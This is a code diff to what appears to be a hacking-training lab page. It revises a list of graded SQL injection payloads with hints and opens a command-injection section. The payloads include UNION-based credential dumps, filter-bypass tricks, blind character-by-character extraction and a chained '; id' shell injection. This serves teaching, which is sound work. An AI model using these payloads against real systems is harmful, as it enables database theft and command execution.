@@ -166,10 +166,10 @@ function show(frameId){ document.getElementById(frameId).style.display='block'; 
 function setCmd(c){ var i=document.getElementById('in_up'); i.value=c; i.dispatchEvent(new Event('input')); }
 const PAYLOADS = {
  q:{
-  easy:{p:"' UNION SELECT username,password,role FROM users-- -", n:"Easy — raw. Classic UNION dump."},
-  medium:{p:"' UNIunionON SELselectECT username,password,role FROM users-- -", n:"Medium — 'union'/'select' stripped once → nest them (UNIunionON)."},
-  hard:{p:"'/**/UNIunionON/**/SELselectECT/**/username,password,role/**/FROM/**/users#", n:"Hard — + spaces stripped → /**/ for spaces, end with #."},
-  expert:{p:"zzz' OR 1=1-- -", n:"Expert — BLIND (match/no-match). Extract char-by-char from users: ' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='S'-- -"}
+  easy:{p:"' UNION SELECT @@version,current_user(),database()-- -", n:"Easy — raw UNION. Goal: fingerprint the DB (version / DB user / current database) — your first recon."},
+  medium:{p:"' UNIunionON SELselectECT table_name,table_schema,3 FROM information_schema.tables WHERE table_schema=database()-- -", n:"Medium — 'union'/'select' stripped once → nest them. Goal: enumerate the tables (schema discovery)."},
+  hard:{p:"'/**/UNIunionON/**/SELselectECT/**/username,password,role/**/FROM/**/users#", n:"Hard — + spaces stripped → /**/ for spaces, end with #. Goal: dump every user's credentials (the password shows in the email slot)."},
+  expert:{p:"zzz' OR 1=1-- -", n:"Expert — BLIND (match/no-match). Goal: extract the hidden flag char-by-char: ' OR (SELECT SUBSTRING(private_note,1,1) FROM users WHERE username='admin')='F'-- -"}
  },
  cmd:{
   easy:{p:"127.0.0.1; id", n:"Easy — raw; chain with ;. Goal: who am I? (uid / gid / groups)."},
